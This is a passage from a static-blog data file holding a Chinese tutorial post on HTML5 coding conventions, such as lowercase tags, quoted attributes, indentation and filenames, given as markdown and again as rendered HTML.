使用引号：\n  - 如果属性值含有空格需要使用引号。\n  - 混合风格不推荐的，建议统一风格。\n  - 属性值使用引号易于阅读。\n\n  ```html\n  <!-- 以下实例属性值包含空格，没有使用引号，所以不能起作用: -->\n  <table class=table striped>\n  \n  <!-- 以下使用了双引号，是正确的： -->\n  <table class=\"table striped\">\n  ```\n\n#### <a>5、图片属性</a>\n\n- 图片通常使用 `alt` 属性。 在图片不能显示时，它能替代图片显示：\n  ```html\n  <img src=\"html5.gif\" alt=\"HTML5\" style=\"width:128px;height:128px\">\n  ```\n\n- 定义好图片的尺寸，在加载时可以预留指定空间，减少闪烁：\n  ```html\n  <img src=\"html5.gif\" alt=\"HTML5\" style=\"width:128px;height:128px\">\n  ```\n\n#### <a>6、空格和等号</a>\n    \n  - 等号前后可以使用空格\n  ```html  \n  <link rel = \"stylesheet\" href = \"styles.css\">\n  ```\n\n  - `推荐` 少用空格\n  ```html  \n  <link rel=\"stylesheet\" href=\"styles.css\">\n  ```\n\n#### <a>7、避免一行代码过长</a>\n\n- 使用 HTML 编辑器，左右滚动代码是不方便的。\n\n- 每行代码尽量少于 `80` 个字符。\n\n#### <a>8、空行和缩进</a>\n\n- 不要无缘无故添加空行。\n- 为每个逻辑功能块添加空行，这样更易于阅读。\n- 缩进使用两个空格，`不建议`使用 `TAB`。\n- 比较短的代码间不要使用不必要的空行和缩进。\n\n#### <a>9、省略 `<html>` `<body>` `<head>` ?</a>\n\n**在 `标准HTML5` 中， `<html>` `<body>` 和 `<head>` 标签是可以省略的，但我们都 `不推荐`。**\n\n- 以下写法是正确的：\n  ```html\n  <!DOCTYPE html>\n  <head>\n    <title>页面标题</title>\n  </head>\n\n  <h1>这是一个标题</h1>\n  <p>这是一个段落。</p>\n  ```\n\n- 为什么不推荐省略呢？\n  - `<html>` 标签是文档的根标签，用于描述页面的语言：\n  ```html\n  <!DOCTYPE html>\n  <html lang=\"zh\">\n  ```\n  - 声明语言是为了方便屏幕阅读器及搜索引擎。\n  - 省略 `<html>` 或 `<body>` 在 `DOM` 和 `XML` 软件中会崩溃。\n  - 省略 `<body>` 在旧版浏览器 `IE9`会发生错误。\n\n- 如果省略 `<head>` 标签，浏览器会将 `<body>` 之前的内容添加到一个默认的 `<head>` 标签上。\n\n#### <a>10、元标签</a>\n\n- `HTML5` 中 `<title>` 标签是必须的，标题名描述了页面的主题：\n  ```html\n  <title>菜鸟教程</title>\n  ```\n- 标题和语言可以让搜索引擎很快了解你页面的主题：\n  ```html\n  <!DOCTYPE html>\n  <html lang=\"zh\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>菜鸟教程</title>\n  </head>\n  ```\n\n#### <a>11、注释</a>\n\n- 注释可以写在 <!-- 和 --> 中:\n  ```html\n  <!-- 这是注释 -->\n  ```\n- 比较长的评论可以在 <!-- 和 --> 中分行写：\n  ```html\n  <!-- \n    这是一个较长评论。 这是 一个较长评论。这是一个较长评论。\n    这是 一个较长评论 这是一个较长评论。 这是 一个较长评论。\n  -->\n  ```\n- 长评论第一个字符缩进两个空格，更易于阅读。\n\n#### <a>12、样式表</a>\n\n- 样式表使用简洁的语法格式 ( `type` 属性不是必须的，在在加载 `js` 脚本时也可省去)：\n  ```html\n  <link rel=\"stylesheet\" href=\"styles.css\">\n  ```\n- 短的规则可以写成一行:\n  ```css\n  p.into {font-family: Verdana; font-size: 16em;}\n  ```\n- 长的规则可以写成多行:\n  ```css\n  body {\n    background-color: lightgrey;\n    font-family: \"Arial Black\", Helvetica, sans-serif;\n    font-size: 16em;\n    color: black;\n  }\n  ```\n  - 将左花括号与选择器放在同一行。\n  - 左花括号与选择器间添加一个空格。\n  - 使用两个空格来缩进。\n  - 冒号与属性值之间添加一个空格。\n  - 逗号和符号之后使用一个空格。\n  - 每个属性与值结尾都要使用分号。\n  - 只有属性值包含空格时才使用引号。\n  - 右花括号放在新的一行。\n  - 每行最多 80 个字符。\n  - 在逗号和冒号后添加空格是常用的一个规则。\n\n#### <a>13、使用小写文件名</a>\n\n- 大多 Web 服务器 (`Apache`, `Unix`) 对大小写敏感： `london.jpg` 不能通过 `London.jpg` 访问。\n- 其他 Web 服务器 (`Microsoft`, `IIS`) 对大小写不敏感： `london.jpg` 可以通过 `London.jpg` 或 `london.jpg` 访问。\n- 你必须保持统一的风格，我们 `建议统一使用小写` 的文件名。\n\n#### <a>14、`.htm` 和 `.html` 的区别</a>\n\n**`.htm` 和 `.html` 的扩展名文件本质上是没有区别的。浏览器和 Web 服务器都会把它们当作 `HTML` 文件来处理。**\n\n- `区别在于：`\n  - `.htm` 应用在早期 `DOS` 系统，系统现在或者只能有三个字符。\n  - 在 `Unix` 系统中后缀没有特别限制，一般用 `.html`。\n\n- `技术上的区别：`\n  - 如果一个 `URL` 没有指定文件名 (如 http://www.runoob.com/css/), 服务器会返回默认的文件名。通常默认文件名为 `index.html`, `index.htm`, `default.html`, 和 `default.htm`。\n  - 如果服务器只配置了 `index.html` 作为默认文件，你必须将文件命名为 `index.html`, 而不是 `index.htm`。\n  - 但是，通常服务器可以设置多个默认文件，你可以根据需要设置默认文件名。\n  - `无论如何`，`HTML` 完整的后缀是 `.html`。\n\n<p style=\"text-align: right\">参考文档 [runoob](http://www.runoob.com/html/html5-syntax.html)</p>","slug":"0809013_HTML5代码规范","published":1,"updated":"2018-03-26T12:18:41.236Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvtu000js4c0ki2lfef7","content":"<h4 id=\"1、使用正确的文档类型\"><a href=\"#1、使用正确的文档类型\" class=\"headerlink\" title=\"1、使用正确的文档类型\"></a><a>1、使用正确的文档类型</a></h4><ul>\n<li>文档类型声明位于HTML文档的第一行：<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 小写也是被允许的 --&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!doctype html&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"2、使用小写标签名\"><a href=\"#2、使用小写标签名\" class=\"headerlink\" title=\"2、使用小写标签名\"></a><a>2、使用小写标签名</a></h4><ul>\n<li><p>HTML5 标签名可以使用大写和小写字母，<code>推荐使用小写字母：</code></p>\n<ul>\n<li>混合了大小写的风格是非常糟糕的。</li>\n<li>开发人员通常使用小写 (类似 XHTML)。</li>\n<li>小写风格看起来更加清爽。</li>\n<li>小写字母容易编写。</li>\n</ul>\n<p><strong>不推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">SECTION</span>&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">SECTION</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>非常糟糕：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Section</span>&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">SECTION</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"3、关闭HTML标签\"><a href=\"#3、关闭HTML标签\" class=\"headerlink\" title=\"3、关闭HTML标签\"></a><a>3、关闭HTML标签</a></h4><ul>\n<li><p><code>双标签：</code> 在 HTML5 中, 你不一定要关闭所有标签 (例如 <code>&lt;p&gt;</code> 标签)，但建议每个标签都要添加关闭标签。<br><strong>不推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。</span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">section</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">section</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>单标签：</code> 在 HTML5 中, 空的 HTML 标签也不一定要关闭：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 1、可以这么写： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 2、也可以这么写： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在 <code>XHTML</code> 和 <code>XML</code> 中斜线 (/) 是必须的。如果你期望 XML 软件使用你的页面，使用这种风格是非常好的。</p>\n</li>\n</ul>\n<h4 id=\"4、标签的属性名和属性值\"><a href=\"#4、标签的属性名和属性值\" class=\"headerlink\" title=\"4、标签的属性名和属性值\"></a><a>4、标签的属性名和属性值</a></h4><p><strong>HTML5 属性名允许使用大写和小写字母。</strong></p>\n<ul>\n<li><p><code>推荐</code> 使用小写字母属性名:</p>\n<ul>\n<li>同时使用大小写是非常不好的习惯。</li>\n<li>开发人员通常使用小写 (类似 XHTML)。</li>\n<li>小写风格看起来更加清爽。</li>\n<li>小写字母容易编写。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 不推荐 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">CLASS</span>=<span class=\"string\">\"menu\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 推荐 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"menu\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><strong>HTML5 属性值可以不用引号</strong></p>\n<ul>\n<li><p>属性值我们 <code>推荐</code> 使用引号：</p>\n<ul>\n<li>如果属性值含有空格需要使用引号。</li>\n<li>混合风格不推荐的，建议统一风格。</li>\n<li>属性值使用引号易于阅读。</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 以下实例属性值包含空格，没有使用引号，所以不能起作用: --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">table</span> <span class=\"attr\">striped</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 以下使用了双引号，是正确的： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table striped\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"5、图片属性\"><a href=\"#5、图片属性\" class=\"headerlink\" title=\"5、图片属性\"></a><a>5、图片属性</a></h4><ul>\n<li><p>图片通常使用 <code>alt</code> 属性。 在图片不能显示时，它能替代图片显示：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"html5.gif\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"HTML5\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:128px;height:128px\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>定义好图片的尺寸，在加载时可以预留指定空间，减少闪烁：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"html5.gif\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"HTML5\"</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:128px;height:128px\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"6、空格和等号\"><a href=\"#6、空格和等号\" class=\"headerlink\" title=\"6、空格和等号\"></a><a>6、空格和等号</a></h4><ul>\n<li><p>等号前后可以使用空格</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span> = <span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span> = <span class=\"string\">\"styles.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>推荐</code> 少用空格</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"styles.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"7、避免一行代码过长\"><a href=\"#7、避免一行代码过长\" class=\"headerlink\" title=\"7、避免一行代码过长\"></a><a>7、避免一行代码过长</a></h4><ul>\n<li><p>使用 HTML 编辑器，左右滚动代码是不方便的。</p>\n</li>\n<li><p>每行代码尽量少于 <code>80</code> 个字符。</p>\n</li>\n</ul>\n<h4 id=\"8、空行和缩进\"><a href=\"#8、空行和缩进\" class=\"headerlink\" title=\"8、空行和缩进\"></a><a>8、空行和缩进</a></h4><ul>\n<li>不要无缘无故添加空行。</li>\n<li>为每个逻辑功能块添加空行，这样更易于阅读。</li>\n<li>缩进使用两个空格，<code>不建议</code>使用 <code>TAB</code>。</li>\n<li>比较短的代码间不要使用不必要的空行和缩进。</li>\n</ul>\n<h4 id=\"9、省略-lt-html-gt-lt-body-gt-lt-head-gt\"><a href=\"#9、省略-lt-html-gt-lt-body-gt-lt-head-gt\" class=\"headerlink\" title=\"9、省略 &lt;html&gt; &lt;body&gt; &lt;head&gt; ?\"></a><a>9、省略 <code>&lt;html&gt;</code> <code>&lt;body&gt;</code> <code>&lt;head&gt;</code> ?</a></h4><p><strong>在 <code>标准HTML5</code> 中， <code>&lt;html&gt;</code> <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 标签是可以省略的，但我们都 <code>不推荐</code>。</strong></p>\n<ul>\n<li><p>以下写法是正确的：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>页面标题<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>这是一个标题<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>为什么不推荐省略呢？</p>\n<ul>\n<li><p><code>&lt;html&gt;</code> 标签是文档的根标签，用于描述页面的语言：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"zh\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>声明语言是为了方便屏幕阅读器及搜索引擎。</p>\n</li>\n<li>省略 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 在 <code>DOM</code> 和 <code>XML</code> 软件中会崩溃。</li>\n<li>省略 <code>&lt;body&gt;</code> 在旧版浏览器 <code>IE9</code>会发生错误。</li>\n</ul>\n</li>\n<li><p>如果省略 <code>&lt;head&gt;</code> 标签，浏览器会将 <code>&lt;body&gt;</code> 之前的内容添加到一个默认的 <code>&lt;head&gt;</code> 标签上。</p>\n</li>\n</ul>\n<h4 id=\"10、元标签\"><a href=\"#10、元标签\" class=\"headerlink\" title=\"10、元标签\"></a><a>10、元标签</a></h4><ul>\n<li><p><code>HTML5</code> 中 <code>&lt;title&gt;</code> 标签是必须的，标题名描述了页面的主题：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>菜鸟教程<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>标题和语言可以让搜索引擎很快了解你页面的主题：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"zh\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>菜鸟教程<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"11、注释\"><a href=\"#11、注释\" class=\"headerlink\" title=\"11、注释\"></a><a>11、注释</a></h4><ul>\n<li><p>注释可以写在 <!-- 和 --> 中:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 这是注释 --&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>比较长的评论可以在 <!-- 和 --> 中分行写：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- </span></span><br><span class=\"line\"><span class=\"comment\">  这是一个较长评论。 这是 一个较长评论。这是一个较长评论。</span></span><br><span class=\"line\"><span class=\"comment\">  这是 一个较长评论 这是一个较长评论。 这是 一个较长评论。</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>长评论第一个字符缩进两个空格，更易于阅读。</p>\n</li>\n</ul>\n<h4 id=\"12、样式表\"><a href=\"#12、样式表\" class=\"headerlink\" title=\"12、样式表\"></a><a>12、样式表</a></h4><ul>\n<li><p>样式表使用简洁的语法格式 ( <code>type</code> 属性不是必须的，在在加载 <code>js</code> 脚本时也可省去)：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"styles.css\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>短的规则可以写成一行:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">p</span><span class=\"selector-class\">.into</span> &#123;<span class=\"attribute\">font-family</span>: Verdana; <span class=\"attribute\">font-size</span>: <span class=\"number\">16em</span>;&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>长的规则可以写成多行:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: lightgrey;</span><br><span class=\"line\">  <span class=\"attribute\">font-family</span>: <span class=\"string\">\"Arial Black\"</span>, Helvetica, sans-serif;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>: <span class=\"number\">16em</span>;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: black;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>将左花括号与选择器放在同一行。</li>\n<li>左花括号与选择器间添加一个空格。</li>\n<li>使用两个空格来缩进。</li>\n<li>冒号与属性值之间添加一个空格。</li>\n<li>逗号和符号之后使用一个空格。</li>\n<li>每个属性与值结尾都要使用分号。</li>\n<li>只有属性值包含空格时才使用引号。</li>\n<li>右花括号放在新的一行。</li>\n<li>每行最多 80 个字符。</li>\n<li>在逗号和冒号后添加空格是常用的一个规则。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"13、使用小写文件名\"><a href=\"#13、使用小写文件名\" class=\"headerlink\" title=\"13、使用小写文件名\"></a><a>13、使用小写文件名</a></h4><ul>\n<li>大多 Web 服务器 (<code>Apache</code>, <code>Unix</code>) 对大小写敏感： <code>london.jpg</code> 不能通过 <code>London.jpg</code> 访问。</li>\n<li>其他 Web 服务器 (<code>Microsoft</code>, <code>IIS</code>) 对大小写不敏感： <code>london.jpg</code> 可以通过 <code>London.jpg</code> 或 <code>london.jpg</code> 访问。</li>\n<li>你必须保持统一的风格，我们 <code>建议统一使用小写</code> 的文件名。</li>\n</ul>\n<h4 id=\"14、-htm-和-html-的区别\"><a href=\"#14、-htm-和-html-的区别\" class=\"headerlink\" title=\"14、.htm 和 .html 的区别\"></a><a>14、<code>.htm</code> 和 <code>.html</code> 的区别</a></h4><p><strong><code>.htm</code> 和 <code>.html</code> 的扩展名文件本质上是没有区别的。浏览器和 Web 服务器都会把它们当作 <code>HTML</code> 文件来处理。</strong></p>\n<ul>\n<li><p><code>区别在于：</code></p>\n<ul>\n<li><code>.htm</code> 应用在早期 <code>DOS</code> 系统，系统现在或者只能有三个字符。</li>\n<li>在 <code>Unix</code> 系统中后缀没有特别限制，一般用 <code>.html</code>。</li>\n</ul>\n</li>\n<li><p><code>技术上的区别：</code></p>\n<ul>\n<li>如果一个 <code>URL</code> 没有指定文件名 (如 <a href=\"http://www.runoob.com/css/\" target=\"_blank\" rel=\"noopener\">http://www.runoob.com/css/</a>), 服务器会返回默认的文件名。通常默认文件名为 <code>index.html</code>, <code>index.htm</code>, <code>default.html</code>, 和 <code>default.htm</code>。</li>\n<li>如果服务器只配置了 <code>index.html</code> 作为默认文件，你必须将文件命名为 <code>index.html</code>, 而不是 <code>index.htm</code>。</li>\n<li>但是，通常服务器可以设置多个默认文件，你可以根据需要设置默认文件名。</li>\n<li><code>无论如何</code>，<code>HTML</code> 完整的后缀是 <code>.html</code>。</li>\n</ul>\n</li>\n</ul>\n<p style=\"text-align: right\">参考文档 <a href=\"http://www.runoob.com/html/html5-syntax.html\" target=\"_blank\" rel=\"noopener\">runoob</a></p>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1、使用正确的文档类型\"><a href=\"#1、使用正确的文档类型\" class=\"headerlink\" title=\"1、使用正确的文档类型\"></a><a>1、使用正确的文档类型</a></h4><ul>\n<li>文档类型声明位于HTML文档的第一行：<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 小写也是被允许的 --&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!doctype html&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"2、使用小写标签名\"><a href=\"#2、使用小写标签名\" class=\"headerlink\" title=\"2、使用小写标签名\"></a><a>2、使用小写标签名</a></h4><ul>\n<li><p>HTML5 标签名可以使用大写和小写字母，<code>推荐使用小写字母：</code></p>\n<ul>\n<li>混合了大小写的风格是非常糟糕的。</li>\n<li>开发人员通常使用小写 (类似 XHTML)。</li>\n<li>小写风格看起来更加清爽。</li>\n<li>小写字母容易编写。</li>\n</ul>\n<p><strong>不推荐：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">SECTION</span>&gt;</span> </span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>这是一个段落。<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">SECTION</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>非常糟糕：</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Section</span>&gt;</span> </span><br><span 